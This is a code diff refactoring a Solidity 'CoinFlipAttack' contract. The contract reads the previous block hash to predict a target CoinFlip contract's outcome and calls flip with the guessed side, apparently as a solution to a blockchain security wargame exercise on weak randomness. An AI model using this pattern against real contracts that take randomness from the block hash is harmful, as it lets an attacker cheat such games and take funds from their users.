@@ -6,11 +6,11 @@ interface ICoinFlip {
 }
 
 contract CoinFlipAttack {
-    function attack(address _target) external {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1;
-        ICoinFlip(_target).flip(side);
+    function attack(ICoinFlip _target) external {
+        uint256 _blockValue = uint256(blockhash(block.number - 1));
+        uint256 _factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 _coinFlip = _blockValue / _factor;
+        bool _side = _coinFlip == 1;
+        _target.flip(_side);
     }
 }
